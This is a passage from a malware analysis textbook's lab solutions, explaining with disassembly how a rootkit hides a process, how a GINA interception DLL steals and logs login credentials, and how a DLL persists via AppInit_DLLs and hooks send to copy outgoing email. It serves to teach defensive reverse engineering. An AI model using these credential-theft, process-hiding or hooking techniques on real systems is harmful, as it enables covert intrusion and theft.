- en: mov ecx, [eax+8Ch]
  prefs: []
  type: TYPE_NORMAL
- en: 00010677 add eax, 88h
  prefs: []
  type: TYPE_NORMAL
- en: 0001067C
  prefs: []
  type: TYPE_NORMAL
- en: mov edx, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: 0001067E
  prefs: []
  type: TYPE_NORMAL
- en: mov [ecx], edx
  prefs: []
  type: TYPE_NORMAL
- en: 00010680
  prefs: []
  type: TYPE_NORMAL
- en: mov ecx, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**565**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00010682
  prefs: []
  type: TYPE_NORMAL
- en: mov eax, [eax+4]
  prefs: []
  type: TYPE_NORMAL
- en: 00010685
  prefs: []
  type: TYPE_NORMAL
- en: mov [ecx+4], eax
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-21L: DeviceIoControl code that modifies the EPROCESS structure*
    The instruction at  obtains a pointer to the next entry in the list. The instruction
    at  obtains a pointer to the previous entry in the list. The instruction at 
    overwrites the BLINK pointer of the next entry so that it points to the previous
    entry. Prior to , the BLINK pointer of the next entry pointed to the current
    entry. The instruction at  overwrites the BLINK pointer so that it skips over
    the current process. The instructions at , , and  perform the same steps, except
    to overwrite the FLINK pointer of the previous entry in the list to skip the current
    entry.'
  prefs: []
  type: TYPE_NORMAL
- en: Rather than change the EPROCESS structure of the current process, the code in
    Listing 10-21L changes the EPROCESS structure of the process in front of it and
    behind it in the linked list of processes. These six instructions hide the current
    process by unlinking it from the linked list of loaded processes, as shown in
    Figure 10-3L.
  prefs: []
  type: TYPE_NORMAL
- en: Process 1
  prefs: []
  type: TYPE_NORMAL
- en: Process 2
  prefs: []
  type: TYPE_NORMAL
- en: Process 3
  prefs: []
  type: TYPE_NORMAL
- en: Process 4
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: LIST_ENTRY
  prefs: []
  type: TYPE_NORMAL
- en: LIST_ENTRY
  prefs: []
  type: TYPE_NORMAL
- en: LIST_ENTRY
  prefs: []
  type: TYPE_NORMAL
- en: LIST_ENTRY
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-3L: A process being removed from the process list so that it’s hidden
    from tools* *such as Task Manager*'
  prefs: []
  type: TYPE_NORMAL
- en: When the OS is running normally, each process has a pointer to the process before
    and after it. However, in Figure 10-3L, Process 2 has been hidden by this rootkit.
    When the OS iterates over the linked list of processes, the hidden process is
    always skipped.
  prefs: []
  type: TYPE_NORMAL
- en: You might wonder how this process continues to run without any problems, even
    though it’s not in the OS’s list of processes. To answer this, remember that a
    process is simply a container for various threads to run inside. The threads are
    scheduled to execute on the CPU. As long as the threads are still properly accounted
    for by the OS, they will be scheduled, and the process will continue to run as
    normal.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 11-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware extracts and drops the file *msgina32.dll* onto disk from a resource
    section named TGAD.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware installs *msgina32.dll* as a GINA DLL by adding it to the registry
    location HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ GinaDLL,
    which causes the DLL to be loaded after system reboot.
  prefs: []
  type: TYPE_NORMAL
- en: '**566**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 125](index-600_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware steals user credentials by performing GINA interception. The *msgina32.dll*
    file is able to intercept all user credentials submitted to the system for authentication.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware logs stolen credentials to *%SystemRoot%\System32\* *msutil32.sys*.
    The username, domain, and password are logged to the file with a timestamp.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Once the malware is dropped and installed, there must be a system reboot for
    the GINA interception to begin. The malware logs credentials only when the user
    logs out, so log out and back in to see your credentials in the log file.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Beginning with basic static analysis, we see the strings GinaDLL and SOFTWARE\
    Microsoft\Windows NT\CurrentVersion\Winlogon, which lead us to suspect that this
    might be GINA interception malware. Examining the imports, we see functions for
    manipulating the registry and extracting a resource section. Because we see resource
    extraction import functions, we examine the file structure by loading *Lab11-01.exe*
    into PEview, as shown in Figure 11-1L.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 1**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-1L:* Lab11-01.exe *in PEview showing the TGAD resource section*
    Examining the PE file format, we see a resource section named TGAD.'
  prefs: []
  type: TYPE_NORMAL
- en: When we click that section in PEview, we see that TGAD contains an embedded
    PE file.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we perform dynamic analysis and monitor the malware with procmon by setting
    a filter for *Lab11-01.exe*. When we launch the malware, we see that it creates
    a file named *msgina32.dll* on disk in the same directory from which the malware
    was launched. The malware inserts the path to *msgina32.dll* into the registry
    key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ GinaDLL, so that
    the DLL will be loaded by Winlogon when the system reboots.
  prefs: []
  type: TYPE_NORMAL
- en: Extracting the TGAD resource section from *Lab11-01.exe* (using Resource Hacker)
    and comparing it to *msgina32.dll*, we find that the two are identical.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we load *Lab11-01.exe* into IDA Pro to confirm our findings. We see that
    the main function calls two functions: sub_401080 (extracts the TGAD resource
    section to *msgina32.dll*) and sub_401000 (sets the GINA registry value). We Solutions
    to Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**567**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: conclude that *Lab11-01.exe* is an installer for *msgina32.dll*, which is loaded
    by Winlogon during system startup.
  prefs: []
  type: TYPE_NORMAL
- en: '**Analysis of msgina32.dll**'
  prefs: []
  type: TYPE_NORMAL
- en: We’ll begin our analysis of *msgina32.dll* by looking at the Strings output,
    as shown in Listing 11-1L.
  prefs: []
  type: TYPE_NORMAL
- en: GinaDLL
  prefs: []
  type: TYPE_NORMAL
- en: Software\Microsoft\Windows NT\CurrentVersion\Winlogon
  prefs: []
  type: TYPE_NORMAL
- en: MSGina.dll
  prefs: []
  type: TYPE_NORMAL
- en: UN %s DM %s PW %s OLD %s 
  prefs: []
  type: TYPE_NORMAL
- en: msutil32.sys
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-1L: Strings output of* msgina32.dll'
  prefs: []
  type: TYPE_NORMAL
- en: The strings in this listing contain what appears to be a log message at , which
    could be used to log user credentials if this is GINA interception malware. The
    string msutil32.sys is interesting, and we will determine its significance later
    in the lab.
  prefs: []
  type: TYPE_NORMAL
- en: Examining *msgina32.dll*’s exports, we see many functions that begin with the
    prefix Wlx. Recall from Chapter 11 that GINA interception malware must contain
    all of these DLL exports because they are required by GINA. We’ll analyze each
    of these functions in IDA Pro.
  prefs: []
  type: TYPE_NORMAL
- en: We begin by loading the malware into IDA Pro and analyzing DllMain, as shown
    in Listing 11-2L.
  prefs: []
  type: TYPE_NORMAL
- en: 1000105A cmp eax, DLL_PROCESS_ATTACH 
  prefs: []
  type: TYPE_NORMAL
- en: 1000105D jnz short loc_100010B7
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 1000107E call ds:GetSystemDirectoryW 
  prefs: []
  type: TYPE_NORMAL
- en: 10001084 lea ecx, [esp+20Ch+LibFileName]
  prefs: []
  type: TYPE_NORMAL
- en: 10001088 push offset String2 ; "\\MSGina"
  prefs: []
  type: TYPE_NORMAL
- en: 1000108D push ecx ; lpString1
  prefs: []
  type: TYPE_NORMAL
- en: 1000108E call ds:lstrcatW
  prefs: []
  type: TYPE_NORMAL
- en: 10001094 lea edx, [esp+20Ch+LibFileName]
  prefs: []
  type: TYPE_NORMAL
- en: 10001098 push edx ; lpLibFileName 10001099 call ds:LoadLibraryW 
  prefs: []
  type: TYPE_NORMAL
- en: 1000109F xor ecx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 100010A1 mov hModule, eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-2L: DllMain of* msgina32.dll *getting a handle to* msgina.dll As
    shown in the Listing 11-2L, DllMain first checks the fdwReason argument at .
    This is an argument passed in to indicate why the DLL entry-point function is
    being called. The malware checks for DLL_PROCESS_ATTACH, which is called when
    a process is starting up or when LoadLibrary is used to load the DLL. If this
    particular DllMain is called during a DLL_PROCESS_ATTACH, the code beginning at
     is called. This code gets a handle to *msgina.dll* in the Windows system directory
    via the call to LoadLibraryW at .'
  prefs: []
  type: TYPE_NORMAL
- en: '**568**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: msgina.dll *is the Windows DLL that implements GINA, whereas* msgina32.dll *is
    the* *malware author’s GINA interception DLL. The name* msgina32 *is designed
    to deceive.*
  prefs: []
  type: TYPE_NORMAL
- en: The malware saves the handle in a global variable that IDA Pro has named hModule
    at . The use of this variable allows the DLL’s exports to properly call functions
    in the *msgina.dll* Windows DLL. Since *msgina32.dll* is intercepting communication
    between Winlogon and *msgina.dll*, it must properly call the functions in *msgina.dll*
    so that the system will continue to operate normally.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we analyze each export function. We begin with WlxLoggedOnSAS, as shown
    in Listing 11-3L.
  prefs: []
  type: TYPE_NORMAL
- en: 10001350 WlxLoggedOnSAS proc near
  prefs: []
  type: TYPE_NORMAL
- en: 10001350 push offset aWlxloggedons_0 ; "WlxLoggedOnSAS"
  prefs: []
  type: TYPE_NORMAL
- en: 10001355 call sub_10001000
  prefs: []
  type: TYPE_NORMAL
- en: 1000135A jmp eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-3L: WlxLoggedOnSAS export just passing through to* msgina.dll The
    WlxLoggedOnSAS export is short and simply passes through to the true WlxLoggedOnSAS
    contained in *msgina.dll*. There are now two WlxLoggedOnSAS functions: the version
    in Listing 11-3L in *msgina32.dll* and the original in *msgina.dll*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 1**'
  prefs: []
  type: TYPE_NORMAL
- en: The function in Listing 11-3L begins by passing the string WlxLoggedOnSAS to
    sub_10001000 and then jumps to the result. The sub_10001000 function uses the
    hModule handle (to *msgina.dll*) and the string passed in (in this case, WlxLoggedOnSAS)
    to use GetProcAddress to resolve a function in *msgina.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: The malware doesn’t call the function; it simply resolves the address of WlxLoggedOnSAS
    in *msgina.dll* and jumps to the function, as seen at . By jumping and not calling
    WlxLoggedOnSAS, this code will not set up a stack frame or push a return address
    onto the stack. When WlxLoggedOnSAS in *msgina.dll* is called, it will return
    execution directly to Winlogon because the return address on the stack is the
    same as what was on the stack when the code in Listing 11-3L is called.
  prefs: []
  type: TYPE_NORMAL
- en: If we continue analyzing the other exports, we see that most operate like WlxLoggedOnSAS
    (they are pass-through functions), except for WlxLoggedOutSAS, which contains
    some extra code. (WlxLoggedOutSAS is called when the user logs out of the system.)
  prefs: []
  type: TYPE_NORMAL
- en: The export begins by resolving WlxLoggedOutSAS within *msgina.dll* using GetProcAddress
    and then calling it. The export also contains the code shown in Listing 11-4L.
  prefs: []
  type: TYPE_NORMAL
- en: 100014FC push offset aUnSDmSPwSOldS  ; "UN %s DM %s PW %s OLD %s"
  prefs: []
  type: TYPE_NORMAL
- en: 10001501 push 0 ; dwMessageId 10001503 call sub_10001570 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-4L: WlxLoggedOutSAS calling the credential logging function sub_10001570*'
  prefs: []
  type: TYPE_NORMAL
- en: The code in Listing 11-4L passes a bunch of arguments and a format string at
    . This string is passed to sub_10001570, which is called at .
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**569**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: It seems like sub_10001570 may be the logging function for stolen credentials,
    so let’s examine it to see what it does. Listing 11-5L shows the logging code
    contained in sub_10001570\.
  prefs: []
  type: TYPE_NORMAL
- en: 1000158E call _vsnwprintf 
  prefs: []
  type: TYPE_NORMAL
- en: 10001593 push offset Mode ; Mode
  prefs: []
  type: TYPE_NORMAL
- en: 10001598 push offset Filename ; "msutil32.sys"
  prefs: []
  type: TYPE_NORMAL
- en: 1000159D call _wfopen 
  prefs: []
  type: TYPE_NORMAL
- en: 100015A2 mov esi, eax
  prefs: []
  type: TYPE_NORMAL
- en: 100015A4 add esp, 18h
  prefs: []
  type: TYPE_NORMAL
- en: 100015A7 test esi, esi
  prefs: []
  type: TYPE_NORMAL
- en: 100015A9 jz loc_1000164F
  prefs: []
  type: TYPE_NORMAL
- en: 100015AF lea eax, [esp+858h+Dest]
  prefs: []
  type: TYPE_NORMAL
- en: 100015B3 push edi
  prefs: []
  type: TYPE_NORMAL
- en: 100015B4 lea ecx, [esp+85Ch+Buffer]
  prefs: []
  type: TYPE_NORMAL
- en: 100015B8 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 100015B9 push ecx ; Buffer 100015BA call _wstrtime 
  prefs: []
  type: TYPE_NORMAL
- en: 100015BF add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 100015C2 lea edx, [esp+860h+var_828]
  prefs: []
  type: TYPE_NORMAL
- en: 100015C6 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 100015C7 push edx ; Buffer 100015C8 call _wstrdate 
  prefs: []
  type: TYPE_NORMAL
- en: 100015CD add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 100015D0 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 100015D1 push offset Format ; "%s %s - %s "
  prefs: []
  type: TYPE_NORMAL
- en: 100015D6 push esi ; File
  prefs: []
  type: TYPE_NORMAL
- en: 100015D7 call fwprintf 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-5L: The credential-logging function logging to* msutil32.sys'
  prefs: []
  type: TYPE_NORMAL
- en: The call to vsnwprintf at  fills in the format string passed in by the WlxLoggedOutSAS
    export. Next, the malware opens the file *msutil32.sys* at , which is created
    inside *C:\Windows\System32\* since that is where Winlogon resides (and *msgina32.dll*
    is running in the Winlogon process). At  and , the date and time are recorded,
    and the information is logged at . You should now realize that *msutil32.sys*
    is used to store logged credentials and that it is not a driver, although its
    name suggests that it is.
  prefs: []
  type: TYPE_NORMAL
- en: 'We force the malware to log credentials by running *Lab11-01.exe*, rebooting
    the machine, and then logging in and out of the system. The following is an example
    of the data contained in a log file created by this malware: 09/10/11 15:00:04
    - UN user DM MALWAREVM PW test123 OLD (null) 09/10/11 23:09:44 - UN hacker DM
    MALWAREVM PW p@ssword OLD (null) The usernames are user and hacker, their passwords
    are test123 and p@ssword, and the domain is MALWAREVM.'
  prefs: []
  type: TYPE_NORMAL
- en: '**570**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: Lab 11-1 is a GINA interceptor installer. The malware drops a DLL on the system
    and installs it to steal user credentials, beginning after system reboot.
  prefs: []
  type: TYPE_NORMAL
- en: Once the GINA interceptor DLL is installed and running, it logs credentials
    to *msutil32.sys* when a user logs out of the system.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 11-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab11-02.dll* contains one export, named installer.'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: If you run the malware from the command line using rundll32.exe Lab11-02.dll,installer,
    the malware copies itself to the Windows system directory as *spoolvxx32.dll*
    and installs itself persistently under AppInit_DLLs.
  prefs: []
  type: TYPE_NORMAL
- en: The malware also tries to open *Lab11-02.ini* from the Windows system directory,
    but it doesn’t find it there.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab11-02.ini* must reside in *%SystemRoot%\System32\* in order for the malware
    to run properly.'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware installs itself in the AppInit_DLLs registry value, which causes
    **1 1**
  prefs: []
  type: TYPE_NORMAL
- en: the malware to be loaded into every process that also loads *User32.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: This malware installs an inline hook of the send function.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The hook checks if the outgoing packet is an email message containing RCPT TO:,
    and if this string is found, it adds an additional RCPT TO line containing a malicious
    email account.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware targets only *MSIMN.exe*, *THEBAT.exe*, and *OUTLOOK.exe* because
    all are email clients. The malware does not install the hook unless it is running
    inside one of these processes.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: The INI file contains an encrypted email address. After decrypting *Lab11-02.ini*,
    we see it contains *billy@malwareanalysisbook.com*.
  prefs: []
  type: TYPE_NORMAL
- en: 9\.
  prefs: []
  type: TYPE_NORMAL
- en: See “Capturing the Network Traffic” on page 580 for our method of capturing
    data using Wireshark, a fake mail server, and Outlook Express.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin with basic static analysis of *Lab11-02.dll*. The DLL has only one
    export, named installer. The malware contains imports for manipulating the registry
    (RegSetValueEx), changing the file system (CopyFile), and searching through a
    process or thread listing (CreateToolhelp32Snapshot). The interesting strings
    for *Lab11-02.dll* are shown in Listing 11-6L.
  prefs: []
  type: TYPE_NORMAL
- en: 'RCPT TO: <'
  prefs: []
  type: TYPE_NORMAL
- en: THEBAT.EXE
  prefs: []
  type: TYPE_NORMAL
- en: OUTLOOK.EXE
  prefs: []
  type: TYPE_NORMAL
- en: MSIMN.EXE
  prefs: []
  type: TYPE_NORMAL
- en: send
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**571**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 126](index-605_1.png)'
  prefs: []
  type: TYPE_IMG
- en: wsock32.dll
  prefs: []
  type: TYPE_NORMAL
- en: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
  prefs: []
  type: TYPE_NORMAL
- en: spoolvxx32.dll
  prefs: []
  type: TYPE_NORMAL
- en: AppInit_DLLs
  prefs: []
  type: TYPE_NORMAL
- en: \Lab11-02.ini
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-6L: Interesting strings in* Lab11-02.dll The strings AppInit_DLLs
    and SOFTWARE\Microsoft\Windows NT\CurrentVersion\ Windows indicate that the malware
    might use AppInit_DLLs to install itself for persistence. The string \Lab11-02.ini
    indicates that the malware uses the INI file provided in this lab.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Examining the contents of *Lab11-02.ini*, we see that it appears to contain
    encoded or encrypted data. The send and wsock32.dll strings may indicate that
    the malware uses networking functionality, but that is unclear until we dig deeper.
    The process names (OUTLOOK.EXE, MSIMN.EXE, and THEBAT.EXE) are email clients,
    and combining those strings with RCPT TO: leads us to suspect that this malware
    does something with email.'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*RCPT is an SMTP command to establish a recipient for an email message.*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we use basic dynamic tools like procmon to monitor the malware.
  prefs: []
  type: TYPE_NORMAL
- en: 'We begin by trying to install the malware using the installer export with the
    following command:'
  prefs: []
  type: TYPE_NORMAL
- en: rundll32.exe Lab11-02.dll,installer
  prefs: []
  type: TYPE_NORMAL
- en: In procmon, we set a filter for the process *rundll32.exe*, and see the malware
    create a file named *spoolvxx32.dll* in the Windows system directory.
  prefs: []
  type: TYPE_NORMAL
- en: Upon further inspection, we see that this file is identical to *Lab11-02.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: Further in the procmon listing, we see the malware add *spoolvxx32.dll* to the
    list of AppInit_DLLs (causing the malware to be loaded into every process that
    loads *User32.dll*). Finally, we see that the malware attempts to open *Lab1102.ini*
    from the Windows system directory. Therefore, we should copy the INI file to the
    Windows system directory in order for the malware to access it.
  prefs: []
  type: TYPE_NORMAL
- en: We move our analysis to IDA Pro to look more deeply into the malware.
  prefs: []
  type: TYPE_NORMAL
- en: We begin by analyzing the installer export. A graph of the cross-references
    from installer is shown in Figure 11-2L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-2L: Cross-reference graph of the installer export* **572**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, installer sets a value in the registry and copies a file to
    the Windows system directory. This matches what we saw during dynamic analysis
    and is confirmed in the disassembly. The installer function’s only purpose is
    to copy the malware to *spoolvxx32.dll* and set it as an AppInit_DLLs value.
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 11-7L, we focus on DllMain, which starts by checking for DLL_PROCESS_ATTACH,
    as with the previous lab. It appears that this malware runs only during DLL_PROCESS_ATTACH;
    otherwise, DllMain returns without doing anything else.
  prefs: []
  type: TYPE_NORMAL
- en: 1000161E cmp [ebp+fdwReason], DLL_PROCESS_ATTACH
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 10001651 call _GetWindowsSystemDirectory 
  prefs: []
  type: TYPE_NORMAL
- en: 10001656 mov [ebp+lpFileName], eax
  prefs: []
  type: TYPE_NORMAL
- en: 10001659 push 104h ; Count 1000165E push offset aLab1102_ini ; \\Lab11-02.ini
    
  prefs: []
  type: TYPE_NORMAL
- en: 10001663 mov edx, [ebp+lpFileName]
  prefs: []
  type: TYPE_NORMAL
- en: 10001666 push edx ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 10001667 call strncat 
  prefs: []
  type: TYPE_NORMAL
- en: 1000166C add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 1000166F push 0 ; hTemplateFile **1 1**
  prefs: []
  type: TYPE_NORMAL
- en: 10001671 push FILE_ATTRIBUTE_NORMAL ; dwFlagsAndAttributes 10001676 push OPEN_EXISTING
    ; dwCreationDisposition 10001678 push 0 ; lpSecurityAttributes 1000167A push FILE_SHARE_READ
    ; dwShareMode 1000167C push GENERIC_READ ; dwDesiredAccess 10001681 mov eax, [ebp+lpFileName]
  prefs: []
  type: TYPE_NORMAL
- en: 10001684 push eax ; lpFileName 10001685 call ds:CreateFileA 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-7L: Code in DllMain that attempts to open* Lab11-02.ini *from the
    system directory* In Listing 11-7L at , we see the Windows system directory retrieved,
    as well as the string for *Lab11-02.ini* at . Together, these form a path with
    the strncat at . The malware attempts to open the INI file for reading at .
    If the file cannot be opened, DllMain returns.'
  prefs: []
  type: TYPE_NORMAL
- en: If the malware successfully opens the INI file, it reads the file into a global
    buffer, as shown in Listing 11-8L at .
  prefs: []
  type: TYPE_NORMAL
- en: 100016A6 push offset byte_100034A0  ; lpBuffer 100016AB mov edx, [ebp+hObject]
  prefs: []
  type: TYPE_NORMAL
- en: 100016AE push edx ; hFile 100016AF call ds:**ReadFile**
  prefs: []
  type: TYPE_NORMAL
- en: 100016B5 cmp [ebp+NumberOfBytesRead], 0 
  prefs: []
  type: TYPE_NORMAL
- en: 100016B9 jbe short loc_100016D2
  prefs: []
  type: TYPE_NORMAL
- en: 100016BB mov eax, [ebp+NumberOfBytesRead]
  prefs: []
  type: TYPE_NORMAL
- en: 100016BE mov byte_100034A0[eax], 0
  prefs: []
  type: TYPE_NORMAL
- en: 100016C5 push offset byte_100034A0 
  prefs: []
  type: TYPE_NORMAL
- en: 100016CA call sub_100010B3
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-8L: Reading and decrypting the INI file*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**573**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 127](index-607_1.png)'
  prefs: []
  type: TYPE_IMG
- en: After the call to ReadFile, the malware checks to make sure the file size is
    greater than 0 at . Next, the buffer containing the file contents is passed to
    sub_100010B3 at . sub_100010B3 looks like it might be a decoding routine because
    it is the first function called after opening a handle to a suspected encoded
    file, so we’ll call it maybeDecoder. To test our theory, we load the malware into
    OllyDbg and set a breakpoint at 0x100016CA. (Make sure you copy the INI file and
    the malware into the Windows system directory and rename the DLL *spoolvxx32.dll*.)
    After the breakpoint is hit, we step over the call maybeDecoder. Figure 11-3L
    shows the result.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-3L: OllyDbg showing the decoded contents of* Lab11-02.ini At  in
    Figure 11-3L, the decrypted content—the email address *billy@*'
  prefs: []
  type: TYPE_NORMAL
- en: '*malwareanalysisbook.com*—is pointed to by EAX. This email address is stored
    in the global variable byte_100034A0, which we rename email_address in IDA Pro
    to aid future analysis.'
  prefs: []
  type: TYPE_NORMAL
- en: 'We have one last function to analyze inside DllMain: sub_100014B6\. Because
    this function will install an inline hook, we’ll rename it hook_installer. The
    hook_installer function is complicated, so before diving into it, we provide a
    high-level overview of what this inline hook looks like after installation in
    Figure 11-4L.'
  prefs: []
  type: TYPE_NORMAL
- en: ws2_32.dll
  prefs: []
  type: TYPE_NORMAL
- en: ws2_32.dll
  prefs: []
  type: TYPE_NORMAL
- en: send
  prefs: []
  type: TYPE_NORMAL
- en: send
  prefs: []
  type: TYPE_NORMAL
- en: call send
  prefs: []
  type: TYPE_NORMAL
- en: send
  prefs: []
  type: TYPE_NORMAL
- en: call send
  prefs: []
  type: TYPE_NORMAL
- en: jmp
  prefs: []
  type: TYPE_NORMAL
- en: malicious
  prefs: []
  type: TYPE_NORMAL
- en: function
  prefs: []
  type: TYPE_NORMAL
- en: code
  prefs: []
  type: TYPE_NORMAL
- en: code
  prefs: []
  type: TYPE_NORMAL
- en: body of
  prefs: []
  type: TYPE_NORMAL
- en: send
  prefs: []
  type: TYPE_NORMAL
- en: function
  prefs: []
  type: TYPE_NORMAL
- en: code
  prefs: []
  type: TYPE_NORMAL
- en: start of
  prefs: []
  type: TYPE_NORMAL
- en: send
  prefs: []
  type: TYPE_NORMAL
- en: function
  prefs: []
  type: TYPE_NORMAL
- en: code
  prefs: []
  type: TYPE_NORMAL
- en: jmp
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-4L: The send function before and after a hook is installed* The
    left side of Figure 11-4L shows what a normal call to the send function in *ws2_32.dll*
    looks like. The right side of the figure shows how hook_installer installs an
    inline hook of the send function. The start of the send function is replaced with
    a jump to malicious code, which calls a trampoline (shown in the figure’s lower-right
    box). The trampoline simply executes the start of the send function (which was
    overwritten with the first jump) and then jumps back to the original send function,
    so that the send function can operate as it did before the hook was installed.'
  prefs: []
  type: TYPE_NORMAL
- en: '**574**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Before hook_installer installs the hook, it checks to see which process the
    malware is running in. To do so, it calls three functions to get the current process
    name. Listing 11-9L contains code from the first of these functions, sub_10001075\.
  prefs: []
  type: TYPE_NORMAL
- en: 1000107D push offset Filename ; lpFilename 10001082 mov eax, [ebp+hModule]
  prefs: []
  type: TYPE_NORMAL
- en: 10001085 push eax ; hModule 10001086 call ds:GetModuleFileNameA 
  prefs: []
  type: TYPE_NORMAL
- en: 1000108C mov ecx, [ebp+arg_4]
  prefs: []
  type: TYPE_NORMAL
- en: '1000108F mov dword ptr [ecx], offset Filename *Listing 11-9L: Calling GetModuleFileNameA
    to get the current process name* As you can see, GetModuleFileNameA is called
    at , and it returns the full path to the process in which the DLL is loaded because
